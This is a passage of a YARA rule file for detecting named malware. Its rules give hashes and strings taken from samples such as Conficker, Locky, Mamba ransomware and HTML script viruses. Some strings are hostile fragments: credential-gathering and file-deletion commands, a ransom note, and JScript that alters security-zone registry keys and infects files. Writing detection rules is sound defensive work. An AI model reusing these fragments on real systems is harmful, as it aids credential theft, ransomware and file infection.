      $s2 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC80.CRT\" version=\"8.0.50727.762\" processorArchitecture=\"x86\" publi" ascii
      $s3 = "c:\\To\\CALs\\The.pdb" fullword ascii
      $s4 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC80.CRT\" version=\"8.0.50727.762\" processorArchitecture=\"x86\" publi" ascii
      $s5 = ".?AVDialog@ScScript@@" fullword ascii
      $s6 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii
      $s7 = ".?AVTextViewImpl@ScScript@@" fullword ascii
      $s8 = ".?AVIDE@ScScript@@" fullword ascii
      $s9 = ".?AVDebugWindow@ScScript@@" fullword ascii
      $s10 = ".?AVTextView@ScScript@@" fullword ascii
      $s11 = "Alternate Private IP Addressing " fullword wide
      $s12 = "@(#)getopt.c" fullword ascii
      $s13 = " -+**3!./-+ 20*1" fullword ascii
      $s14 = "@(#)getopt1.c" fullword ascii
      $s15 = "435B5c5}5" fullword ascii
      $s16 = "=*>4>>>d>{>" fullword ascii
      $s17 = "50 - 80 m" fullword wide
      $s18 = "80 - 110 m" fullword wide
      $s19 = "110 - 140 m" fullword wide
      $s20 = "nnnnlolnjn" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule conficker {
   meta:
      filename = "MAL - file conficker"
      hash1 = "523d40c69b0972ddeff0682fcb569e8a346cf10b2894479ab227bbb24e19846e"
   strings:
      $s1 = "\"http://www.w3.org/TR/html4/strict.dtd\"> -->" fullword ascii
      $s2 = "<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd\">" fullword ascii
      $s3 = "<META HTTP-EQUIV=\"Refresh\" CONTENT=\"0.1\">" fullword ascii
      $s4 = "<META HTTP-EQUIV=\"Expires\" CONTENT=\"-1\">" fullword ascii
      $s5 = "<!-- <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"" fullword ascii
      $s6 = "<META HTTP-EQUIV=\"Pragma\" CONTENT=\"no-cache\">" fullword ascii
      $s7 = "ceilpW5" fullword ascii
      $s8 = "- 58=DC=" fullword ascii
      $s9 = "3@,a '){" fullword ascii
      $s10 = "m /fjo" fullword ascii
      $s11 = "<BODY><P></BODY>" fullword ascii
      $s12 = ".)jgjP?" fullword ascii
      $s13 = "just_fdiv" fullword ascii
      $s14 = "CQDtb\\q3I" fullword ascii
      $s15 = "rUked/change" fullword ascii
      $s16 = "$hfIZrh95cU'G" fullword ascii
      $s17 = "hlpt####|" fullword ascii
      $s18 = "qUbJ *6" fullword ascii
      $s19 = "XAYk7\"" fullword ascii
      $s20 = "IsDBCSLead" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule INTC_BOOT {
   meta:
      filename = "MAL - file INTC_BOOT.IMA"
      hash1 = "5b9a87b1b38ec40bbce93f180e958237766ee64af550325f67bc4896ddcaa5d2"
   strings:
      $x1 = "Filename: MPUDEMO1.DOC - filename of MPUDEMO1.BAS, MPUDEMO1.EXE" fullword ascii
      $s2 = "<A HREF=\"http://www.xscount.com/cgi/xsc.show?id=midiwebcom\" TARGET=\"_new\">" fullword ascii
      $s3 = "<IMG BORDER=0 WIDTH=1 HEIGHT=1 SRC=\"http://www.xscount.com/cgi/xsc.gif?id=midiwebcom&ref=nojavascript&tc=notc\"></a>" fullword ascii
      $s4 = "countcall=\"<A HREF=\\\"http://www.xscount.com/cgi/xsc.show?id=\"+idname+\"\\\" TARGET=\\\"_new\\\">\"" fullword ascii
      $s5 = "MPUDEMO1.EXE" fullword ascii
      $s6 = "CAKEKEY.EXE" fullword ascii
      $s7 = "3333335KJ5Error at pgm-ctr:Requires DOS #2.XX/3.XXMissing numeric co-processorProgram too big to fit in memory" fullword ascii
      $s8 = "' MPU-401 Command Port on IBM" fullword ascii
      $s9 = "By:   Gino F. Silvestri - CompuServe ID: 71505,1436,  GEnie: SILVESTRI" fullword ascii
      $s10 = "An executable and source code are included in the .zip. To run the" fullword ascii
      $s11 = "SYSKEY.TXTMRMo" fullword ascii
      $s12 = "<AREA SHAPE=\"RECT\" COORDS=\"0,40,107,59\" HREF=\"/tech/index.shtml\" TARGET=\"text\">" fullword ascii
      $s13 = "' Send MPU-401 RESET Command" fullword ascii
      $s14 = "<PARAM NAME=target VALUE=\"text\">" fullword ascii
      $s15 = "' *   FileName:  MPUDEMO1.BAS, MPUDEMO1.EXE - for IBM and ROLAND MPU-401    *" fullword ascii
      $s16 = "<AREA SHAPE=\"RECT\" COORDS=\"0,60,107,79\" HREF=\"/programming/index.shtml\" TARGET=\"text\">" fullword ascii
      $s17 = "<IMG SRC=\"/cgi-bin/Counter.cgi?tr=Y&srgb=0;255;0&prgb=20;255;255&pad=N&ft=0&dd=A&df=midiweb.dat\" ALIGN=ABSBOTTOM ALT=\"counter" ascii
      $s18 = "  char target[15]=\"\";" fullword ascii
      $s19 = "<AREA SHAPE=\"RECT\" COORDS=\"0,100,107,119\" HREF=\"/survey/index.shtml\" TARGET=\"text\">" fullword ascii
      $s20 = "<AREA SHAPE=\"RECT\" COORDS=\"0,140,107,159\" HREF=\"/about/index.shtml\" TARGET=\"text\">" fullword ascii
   condition:
      uint16(0) == 0x3ceb and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule HTML_Jsv_b {
   meta:
      filename = "MAL - file HTML.Jsv.b.HTM"
      hash1 = "7ec03dd1b5373e20ad98dde741e41c82ee9cbbb5c70af319560eefe6ebe5dea0"
   strings:
      $s1 = "href=\"http://www.geocities.com/SiliconValley/Horizon/9386\">1nternal's" fullword ascii
      $s2 = "var TempFile = FSO.GetTempName();" fullword ascii
      $s3 = "WSHShell.RegWrite(\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Zones\\\\0\\\\1201\" , 0," ascii
      $s4 = "--></script>" fullword ascii
      $s5 = "WSHShell.RegWrite(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Zones\\\\0\\\\1201\" , 0," ascii
      $s6 = "FSO.CopyFile(fc.item(), TempFile);" fullword ascii
      $s7 = "var cpath = FSO.GetParentFolderName(HostPath);" fullword ascii
      $s8 = "FSO.DeleteFile(TempFile);" fullword ascii
      $s9 = "window.status = \"HTML.JScript v0.1 /1nternal\";" fullword ascii
      $s10 = "var WSHShell = new ActiveXObject(\"WScript.Shell\");" fullword ascii
      $s11 = "<meta name=\"Author\" content=\"1nternal\">" fullword ascii
      $s12 = "var fr = FSO.OpenTextFile(TempFile, 1, false);" fullword ascii
      $s13 = "<title>HTML.JScript v0.1</title>" fullword ascii
      $s14 = "<p align=\"center\"><strong>HTML.JScript v0.1</strong></p>" fullword ascii
      $s15 = "var FSO = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii
      $s16 = "<script language=\"JavaScript\"><!--" fullword ascii
      $s17 = "var Folder = FSO.GetFolder(cpath)" fullword ascii
      $s18 = "<html> <!--1nternal-->" fullword ascii
      $s19 = "HostPath = HostPath.replace(/\\//g, \"\\\\\");" fullword ascii
      $s20 = "cpath = FSO.GetParentFolderName(cpath);" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 6KB and
      8 of them
}

rule virus_lame {
   meta:
      filename = "MAL - file HTML.Lame.HTM"
      hash1 = "4bc4f935970802aa99177d2e8fdc099ccc54f0c59812b10482dca7729240d542"
   strings:
      $s1 = "// Coded by Bumblebee[UC]" fullword ascii
      $s2 = "//LameEnds--></SCRIPT>" fullword ascii
      $s3 = "infected+=host" fullword ascii
      $s4 = "infected+=host.slice(0,i)" fullword ascii
      $s5 = "infected=host.slice(0,i)" fullword ascii
      $s6 = "var file,fso,host,i,j,infected,virus,virusPath" fullword ascii
      $s7 = "<meta name=\"AUTHOR\" content=\"Bumblebee[UC]\">" fullword ascii
      $s8 = "reading this message with IE offline, <b>you are infected</b>." fullword ascii
      $s9 = "<p>WARNING - this is the Html.Lame virus - WARNING</p>" fullword ascii
      $s10 = "file.write(infected)" fullword ascii
      $s11 = "host=file.readAll()" fullword ascii
      $s12 = "<SCRIPT lenguage=\"JavaScript\" lame><!--" fullword ascii
      $s13 = "var fso=new ActiveXObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s14 = "fso=new ActiveXObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s15 = "i=virus.search(new RegExp(\"<SCRIPT lenguage=\\\"JavaScript\\\" lame>\"))" fullword ascii
      $s16 = "content=\"text/html; charset=iso-8859-1\">" fullword ascii
      $s17 = "lameDir(fso.GetFolder(winDir.path+\"\\\\Web\\\\Wallpaper\"))" fullword ascii
      $s18 = "lameDir(fso.GetFolder(winDir.path+\"\\\\Help\"))" fullword ascii
      $s19 = "if(host.search(new RegExp(\"Html.Lame\"))==-1) {" fullword ascii
      $s20 = "lameDir(fso.GetSpecialFolder(2))" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 6KB and
      8 of them
}

rule Junkie_BOOT {
   meta:
      filename = "MAL - file Junkie_BOOT.IMA"
      hash1 = "edb23b8b8c5c7925b4d0cd2cefcc7964af2803bd1b704331a898640e890f0d5b"
   strings:
      $s1 = "logos.sys" fullword ascii
      $s2 = "WININIT.EXE" fullword ascii
      $s3 = "Windows requires a computer with a 386 processor or better." fullword ascii
      $s4 = "DOSSTART.BAT" fullword ascii
      $s5 = "WOSAPPC:\\MSDOSSYS.STS" fullword ascii
      $s6 = "Old Bal: 166.28 - .00(Out) + .00(In) = Balance: 166.28" fullword ascii
      $s7 = "Old Bal: 434.05 - .00(Out) + 37.50(In) = Balance: 471.55" fullword ascii
      $s8 = "Old Bal: 5614.52 - .00(Out) + .00(In) = Balance: 5614.52" fullword ascii
      $s9 = "Old Bal: 4972.43 - .00(Out) + 825.00(In) = Balance: 5797.43" fullword ascii
      $s10 = "Old Bal: 3.00 - .00(Out) + .00(In) = Balance: 3.00" fullword ascii
      $s11 = "Old Bal: 12.10 - .00(Out) + 1.10(In) = Balance: 13.20" fullword ascii
      $s12 = "Old Bal: 343.40 - .00(Out) + 49.86(In) = Balance: 393.26" fullword ascii
      $s13 = "Old Bal: 17.00 - .00(Out) + 83.32(In) = Balance: 100.32" fullword ascii
      $s14 = "Old Bal: 429.75 - .00(Out) + 79.99(In) = Balance: 509.74" fullword ascii
      $s15 = "Old Bal: 850.00 - .00(Out) + .00(In) = Balance: 850.00" fullword ascii
      $s16 = "Old Bal: 153.40 - .00(Out) + 78.65(In) = Balance: 232.05" fullword ascii
      $s17 = "Old Bal: 185.54 - .00(Out) + 30.07(In) = Balance: 215.61" fullword ascii
      $s18 = "Old Bal: 65.00 - .00(Out) + .00(In) = Balance: 65.00" fullword ascii
      $s19 = "Old Bal: 1005.68 - .00(Out) + .00(In) = Balance: 1005.68" fullword ascii
      $s20 = "Old Bal: 58.77 - .00(Out) + 2.09(In) = Balance: 60.86" fullword ascii
   condition:
      uint16(0) == 0x3eeb and filesize < 200KB and
      8 of them
}

rule Kampana_A__BOOT {
   meta:
      filename = "MAL - file Kampana(A)_BOOT.IMA"
      hash1 = "a1a954a20e50bab0e9827180d4f4a8754654e3d41de73c4897dbf81487e6cef7"
   strings:
      $x1 = "-> Copies of CONFIG.SYS, AUTOEXEC.BAT and any error messages" fullword ascii
      $s2 = "   pkzip test3.zip *.* -xcommand.com -xautoexec.* -xconfig.*" fullword ascii
      $s3 = "C:\\>edit autoexec.bat" fullword ascii
      $s4 = "**  Notice there is no space between the -s and the encryption key." fullword ascii
      $s5 = "Add PK Safe ANSI to your AUTOEXEC.BAT command file.  Early in your" fullword ascii
      $s6 = "a temporary .ZIP file will exist during the deletion process.  In order to" fullword ascii
      $s7 = "up some disk space on the target drive.  Also, see the -b option and the PKTMP" fullword ascii
      $s8 = "The .ZIP file you are attempting to process is corrupt.  You may attempt" fullword ascii
      $s9 = "has a -s option which is used to encrypt the files.  If a password is not" fullword ascii
      $s10 = "ZIP2EXE: (E09) Disk full writing target file during EXE to ZIP process" fullword ascii
      $s11 = "ZIP2EXE: (E11) Disk full writing target file during ZIP to EXE process" fullword ascii
      $s12 = "-> Any command will behave as though the -r option has been used" fullword ascii
      $s13 = "   F:\\>zip2exe -e test.exe" fullword ascii
      $s14 = "attributes off the file during the ZIP process by specifying the -j (lower" fullword ascii
      $s15 = "   C:\\>zip test -s *.com" fullword ascii
      $s16 = "line will work fine.  This line should be near the top of the AUTOEXEC.BAT" fullword ascii
      $s17 = "the - k option is specified on the command line the .ZIP file date will not" fullword ascii
      $s18 = "   191872  DeflatX   80773  58%  01-31-92  15:02  25cf904a --w-  AM.EXE" fullword ascii
      $s19 = "AUTOEXEC.BAT file." fullword ascii
      $s20 = "The file XXXXX is compressed or encoded in a way that this version of PKUNZIP" fullword ascii
   condition:
      uint16(0) == 0x1ceb and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule Jumper_BOOT {
   meta:
      filename = "MAL - file Jumper_BOOT.IMA"
      hash1 = "1c93ca2836569b6cbeea3fc4103c7152403b5c049bad3e4d75ded311ffaee00e"
   strings:
      $s1 = "SHWTXT50.DLL" fullword ascii
      $s2 = "SHWUTL50.DLL" fullword ascii
      $s3 = "SHWPLY50.DLL" fullword ascii
      $s4 = "OPTLOADER - Copyright (C) 1993 SLR Systems" fullword ascii
      $s5 = "W4W05F.DLL" fullword ascii
      $s6 = "W4W19T.DLL" fullword ascii
      $s7 = "W4W05T.DLL" fullword ascii
      $s8 = "Language=shweng50.dll" fullword ascii
      $s9 = "W4W21T.DLL" fullword ascii
      $s10 = "W4W07T.DLL" fullword ascii
      $s11 = "W4W07F.DLL" fullword ascii
      $s12 = "W4W19F.DLL" fullword ascii
      $s13 = "W4W33F.DLL" fullword ascii
      $s14 = "CAAPLAY.DLL" fullword ascii
      $s15 = ":??0CKEYCONDITION@@REC@GW4KEYSTATE@CKEYEVENT@@W4LOGOPER@@@ZD" fullword ascii
      $s16 = "ETDNVNVNF" fullword ascii
      $s17 = "SHWDSP50.DLLPK" fullword ascii
      $s18 = "SHWENG50.DLLPK" fullword ascii
      $s19 = "SHWUTL50.DLLMZ" fullword ascii
      $s20 = "SHWIO50.DLLPK" fullword ascii
   condition:
      uint16(0) == 0x01eb and filesize < 4000KB and
      8 of them
}

rule vtool_mich_malware {
   meta:
      filename = "MAL - file MICHELAN.ASM"
      hash1 = "4d3cc687673eb38dbfea35505b8b5e4b535209e7957ebadd37541f0a002866cc"
   strings:
      $s1 = "NNTP-Posting-Host: ix-pas2-10.ix.netcom.com" fullword ascii
      $s2 = "From netcom.com!ix.netcom.com!netnews Tue Nov 29 09:45:29 1994" fullword ascii
      $s3 = "References: <sbringerD00yHv.Hs3@netcom.com> <bradleymD011vJ.Lp8@netcom.com>" fullword ascii
      $s4 = "Message-ID: <3bf9pp$iil@ixnews1.ix.netcom.com>" fullword ascii
      $s5 = "Xref: netcom.com alt.comp.virus:511" fullword ascii
      $s6 = "Path: netcom.com!ix.netcom.com!netnews" fullword ascii
      $s7 = "From: Zeppelin@ix.netcom.com (Mr. G)" fullword ascii
      $s8 = "Newsgroups: alt.comp.virus" fullword ascii
      $s9 = "infectitnow:" fullword ascii
      $s10 = "infectharddisk:" fullword ascii
      $s11 = "quitinfect:" fullword ascii
      $s12 = "infectdisk:" fullword ascii
      $s13 = "checkinfect:" fullword ascii
      $s14 = "; and partition table infector." fullword ascii
      $s15 = "head/cylinder" fullword ascii
      $s16 = "skiponerror:" fullword ascii
      $s17 = "readbootblock:" fullword ascii
      $s18 = "                jnc     checkinfect             ; continue if no error" fullword ascii
      $s19 = "                jc      quitinfect              ; exit on error" fullword ascii
      $s20 = "Organization: Netcom" fullword ascii
   condition:
      uint16(0) == 0x7246 and filesize < 30KB and
      8 of them
}

rule NitlovePOS_Stealler {
   meta:
      filename = "MAL - file NitlovePOS.bin"
      hash1 = "2a1f5a04025b7837d187ed8e9aaab7b5fff607327866e9bc9e5da83a84b56dda"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii
      $s2 = " constructor or from DllMain." fullword ascii
      $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
      $s4 = "TeamSpeak Systems GmbH" fullword wide
      $s5 = "(C) 2007-2014 TeamSpeak Systems GmbH" fullword wide
      $s6 = "DINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDING" fullword ascii
      $s7 = "|PA<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">" fullword ascii
      $s8 = "kocp`0.0" fullword ascii
      $s9 = "PjUj$j]" fullword ascii
      $s10 = "  </trustInfo>" fullword ascii
      $s11 = "OCCkl4^K" fullword ascii
      $s12 = "aQmmiiexoeK" fullword ascii
      $s13 = "TeamSpeak 3 Client Updater" fullword wide
      $s14 = "This indicates a bug in your application. It is most likely the result of calling an MSIL-compiled (/clr) function from a native" ascii
      $s15 = "      <requestedPrivileges>" fullword ascii
      $s16 = "      </requestedPrivileges>" fullword ascii
      $s17 = "^EK[UU" fullword ascii
      $s18 = "?H\"02;4I9" fullword ascii
      $s19 = "g6fEyp" fullword ascii
      $s20 = "yT1&>}" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      any of them
}

rule cerber_ransomware {
   meta:
      filename = "MAL - file cerber_ransomware.exe"
      hash1 = "e67834d1e8b38ec5864cfa101b140aeaba8f1900a6e269e6a94c90fcbfe56678"
   strings:
      $s1 = "<!-- Setup program compatibility. Inform the system the application supports Windows 7. -->" fullword ascii
      $s2 = "<filename>Form Filler And Password Mananger.</filename>" fullword ascii
      $s3 = "66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666" ascii
      $s4 = "2222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222" ascii
      $s5 = " xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii
      $s6 = "777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777" ascii
      $s7 = "qnnllllddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddllllnnq" fullword ascii
      $s8 = "    processorArchitecture=\"X86\"" fullword ascii
      $s9 = "            processorArchitecture=\"X86\"" fullword ascii
      $s10 = "77733,,,0,*(%" fullword ascii
      $s11 = "660022222+222+222+222+22222.000" fullword ascii
      $s12 = "==22.//////////////22==" fullword ascii
      $s13 = "effffffffffe" ascii
      $s14 = "defffffffffee" ascii
      $s15 = "imimimimiiiiiiiioooooggggggggggggggggggggggggggggggggggggggooooo" fullword ascii
      $s16 = "oookokokokkomokkomokkomokkomokkomokkomokkomokkomkomooooooooo" fullword ascii
      $s17 = "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd" ascii
      $s18 = "jjjjjjjjjiiiiiiiiiiiiiiiiii" fullword ascii
      $s19 = "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd" ascii
      $s20 = "rnlddddddddddddd" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule MAL_Locky {
   meta:
      filename = "MAL - file Locky"
      hash1 = "bc98c8b22461a2c2631b2feec399208fdc4ecd1cd2229066c2f385caa958daa3"
   strings:
      $s1 = "FileSee.com" fullword wide
      $s2 = "InjectableLogistics" fullword ascii
      $s3 = "IdealistsInjecting" fullword ascii
      $s4 = "HolidaysMultiprocessors" fullword ascii
      $s5 = "IncompetenceLithologies" fullword ascii
      $s6 = "MultiprocessorLyrically" fullword ascii
      $s7 = "LainOperable" fullword ascii
      $s8 = "IntenseFigurehead" fullword ascii
      $s9 = "FigureheadGlider" fullword ascii
      $s10 = "HistologyLeprosy" fullword ascii
      $s11 = "MicrobiologistImparting" fullword ascii
      $s12 = "HeadacheLowland" fullword ascii
      $s13 = "NeurobiologyHardened" fullword ascii
      $s14 = "FloodsIgnoring" fullword ascii
      $s15 = "MoraineForgetmenots" fullword ascii
      $s16 = "MansizedOperative" fullword ascii
      $s17 = "HistologyOre" fullword ascii
      $s18 = "IroniesLogicians" fullword ascii
      $s19 = "HeadiestImpedance" fullword ascii
      $s20 = "GreyedMutates" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      8 of them
}

rule Matsnu_MBRwipingRansomware_ {
   meta:
      filename = "MAL - file Matsnu-MBRwipingRansomware .com_"
      hash1 = "7634433f8fcf4d13fb46d680802e48eeb160e0f51e228cae058436845976381e"
   strings:
      $s1 = "eedcxqpokmlk" fullword ascii
      $s2 = "Error renaming file" fullword ascii
      $s3 = "JcmD,HTm=T5`" fullword ascii
      $s4 = " is a string chars long" fullword ascii
      $s5 = "DDDJ111" fullword ascii
      $s6 = "COMSPEC" fullword ascii
      $s7 = "Broken pipe" fullword ascii
      $s8 = "Permission denied" fullword ascii
      $s9 = "INGN\\G" fullword ascii
      $s10 = "YqMJ=xhQv" fullword ascii
      $s11 = "1\"1;1O1U1^1q1" fullword ascii 
      $s12 = "7C7L7X7" fullword ascii 
      $s13 = "EGH3877" fullword ascii 
      $s14 = "File successfully renamed" fullword ascii
      $s15 = "Hexadecimal: %x" fullword ascii
      $s16 = "Enter your age: " fullword ascii
      $s17 = "%),2,(%" fullword ascii 
      $s18 = "Enter a hexadecimal number: " fullword ascii
      $s19 = "Just print the percentage sign %%" fullword ascii
      $s20 = "8c9m9z9" fullword ascii 
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule Ransomware_mamba {
   meta:
      filename = "MAL - file Ransomware_mamba.exe"
      hash1 = "2ecc525177ed52c74ddaaacd47ad513450e85c01f2616bf179be5b576164bf63"
   strings:
      $x1 = "schtasks /create /tn DefragmentService /TR \"cmd.exe /c net use >> c:\\dc22\\netuse.txt\" /sc DAILY" fullword ascii
      $x2 = "cLcAADMxY2Q2NjRlZDI2OGI4NjOBKli1mxn7QBFk4I6KnATRzK7N4OX9wXjzOgp7DnTNx_yEzcHgv2fbgbTXH50pcn2ho5jR6t7zUIIhqIybeX06zDfmK8VfiosbGZOu" ascii
      $x3 = "0I8AADNkYzk0MTAzNzMxYjRkMTA1LQpDgd9mC09Lnensv96WYHWPdfy3YbjodjJQKxtnQtKbGPDDXk6cVz9HNxrfmddmWkk_1ngshN4Xmn3V4QAbh8lhCXoR_jsJei0x" ascii
      $x4 = " & taskkill /im Mount.exe & Del \"C:\\DC22\\Mount.exe\" & Del \"C:\\DC22\\netpass.txt\"  & Del \"C:\\DC22\\netuse.txt\"  & Del " ascii
      $x5 = " & taskkill /im Mount.exe & Del \"C:\\DC22\\Mount.exe\" & Del \"C:\\DC22\\netpass.txt\"  & Del \"C:\\DC22\\netuse.txt\"  & Del " ascii
      $x6 = "cmd /c net use >> c:\\dc22\\netuse.txt" fullword ascii
      $x7 = "cmd.exe /c net use m: " fullword ascii
      $x8 = "You are Hacked !!!! Your H.D.D Encrypted , Contact Us For Decryption Key (w889901665@yandex.com) YOURID: 123139" fullword ascii
      $s9 = "C:\\DC22\\netpass.exe  /stab C:\\DC22\\netpass.txt" fullword ascii
      $s10 = "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & sc delete DefragmentService & Del \"" fullword ascii
      $s11 = "C:\\DC22\\log_file.txt" fullword ascii
      $s12 = "32netpass.exe" fullword wide
      $s13 = "netpass.exe" fullword wide
      $s14 = "64netpass.exe" fullword wide
      $s15 = "32NETPASS.EXE" fullword wide
      $s16 = "64NETPASS.EXE" fullword wide
      $s17 = "DFServerService.exe" fullword wide
      $s18 = "C:\\DC22\\Mount.exe" fullword ascii
      $s19 = "ass.exe\" & net user /del mythbusters" fullword ascii
      $s20 = "Error getting bootloader configuration" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and 4 of them
}

rule Nobelium_Trojan_Downloader {
   meta:
      filename = "MAL - file Nobelium_Trojan_Downloader"
      hash1 = "dbb39c2f143265ad86946d1c016226b0e01614af35a2c666afa44ac43b76b276"
   strings:
      $s1 = "BugSplatRc64.dll" fullword ascii
      $s2 = "endptr == token_buffer.data() + token_buffer.size()" fullword ascii
      $s3 = "St11_Mutex_baseILN9__gnu_cxx12_Lock_policyE2EE" fullword ascii
      $s4 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii
      $s5 = "template parameter object for " fullword ascii
      $s6 = "n_chars < number_buffer.size() - 1" fullword ascii
      $s7 = "last - first >= std::numeric_limits<FloatType>::max_digits10 + 6" fullword ascii
      $s8 = "last - first >= std::numeric_limits<FloatType>::max_digits10" fullword ascii
      $s9 = "last - first >= kMaxExp + 2" fullword ascii
      $s10 = "last - first >= 2 + (-kMinExp - 1) + std::numeric_limits<FloatType>::max_digits10" fullword ascii
      $s11 = "syntax error " fullword ascii
      $s12 = "object key" fullword ascii
      $s13 = "buf[len - 1] != '0'" fullword ascii
      $s14 = "; last read: '" fullword ascii
      $s15 = "port at H" fullword ascii
      $s16 = "https://L)" fullword ascii
      $s17 = "other_error" fullword ascii
      $s18 = "ranges.size() == 2 || ranges.size() == 4 || ranges.size() == 6" fullword ascii
      $s19 = "!key_keep_stack.empty()" fullword ascii
      $s20 = "N8nlohmann6detail11parse_errorE" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule Proteus_Botnet {
   meta:
      filename = "MAL - file Proteus_Botnet.exe"
      hash1 = "d23b4a30f6b1f083ce86ef9d8ff434056865f6973f12cb075647d013906f51a2"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii
      $s2 = "gchrome.exe" fullword wide
      $s3 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s4 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii
      $s5 = "\\4&\\}0:" fullword ascii
      $s6 = "* r^u0" fullword ascii
      $s7 = "get_Fstring" fullword ascii
      $s8 = "Hs}.cmD,," fullword ascii
      $s9 = "5.@_\\'&1" fullword ascii
      $s10 = "wuRac2diR9EuFTpYmb" fullword ascii
      $s11 = "Mt]SgZi%s%'" fullword ascii
      $s12 = "iUSg* k{F" fullword ascii
      $s13 = "Mjufcsdbce.Form1.resources" fullword ascii
      $s14 = ")MH0F:\"j" fullword ascii
      $s15 = "v:\"Ob;d" fullword ascii
      $s16 = "ZPKE.mtkG" fullword ascii
      $s17 = "VFc32lDTLcWWPU3RG6.GyiXKkS7uNcLbOiRsU.resources" fullword ascii
      $s18 = "Mjufcsdbce.Properties" fullword ascii
      $s19 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" fullword ascii
      $s20 = "cyV:\\\"S" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      8 of them
}

rule Ransomware_neurevt {
   meta:
      filename = "MAL - file Ransomware_neurevt.exe"
      hash1 = "517ac5506a5488a1193686f66cb57ad3288c2258c510004edb2f361b674526cc"
   strings:
      $x1 = "cHZsa2IlVnx2cWBoPggPcHZsa2IlVnx2cWBoK0xKPggPcHZsa2IlVnx2cWBoK1FgfXE+CA9wdmxrYiVWfHZxYGgrV2BjaWBmcWxqaz4ID3B2bGtiJVZ8dnFgaCtRbXdg" wide
      $s2 = "Ea6dq8F1DhAt0XmH.MZVgFJNgR2Tj7eIu.exe" fullword wide
      $s3 = "L29wdGltaXplKyAvcGxhdGZvcm06WDg2IC9kZWJ1ZysgL3RhcmdldDp3aW5leGU=" fullword wide
      $s4 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s5 = "U3lzdGVtLkRyYXdpbmcuZGxs" fullword wide 
      $s6 = "ekp5blhVaktUbFpw" fullword wide 
      $s7 = "VVVlb0NvaXBHdVZj" fullword wide
      $s8 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii
      $s9 = "I3Jlc25hbWUj" fullword wide
      $s10 = "Dljt:\\_\\5>" fullword ascii
      $s11 = "DoubleMinMaxAggregationOperator" fullword ascii
      $s12 = "<GetElementsAfterSelf>d__41" fullword ascii
      $s13 = "<GetExtraMonoPaths>d__41" fullword ascii
      $s14 = "gpwwwww" fullword ascii
      $s15 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" fullword ascii
      $s16 = "HTTP_REQUEST_V2" fullword ascii
      $s17 = "~RAO:\">9)}" fullword ascii
      $s18 = "Ea6dq8F1DhAt0XmH.MZVgFJNgR2Tj7eIu" fullword ascii
      $s19 = "Qekb.qwyR" fullword ascii
      $s20 = "AppPolicyClrCompat" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule Poweliks_Trojan_dropper {
   meta:
      filename = "MAL - file Poweliks_Trojan_dropper.ex_"
      hash1 = "4727b7ea70d0fc00f96a28de7fa3d97fa9d0b253bd63ae54fbbf0bd0c8b766bb"
   strings:
      $s1 = "0.0.0.2" fullword wide 
      $s2 = "Sotssere._.bat" fullword ascii
      $s3 = "Cesscoryshodpyro0hazynthgunsraga1-0-.Combawedsati_takeyap_._" fullword ascii
      $s4 = "?ErrorCommon@@YGEPAG@Z" fullword ascii
      $s5 = "System Unknown" fullword wide
      $s6 = "6$\\.\\V" fullword ascii
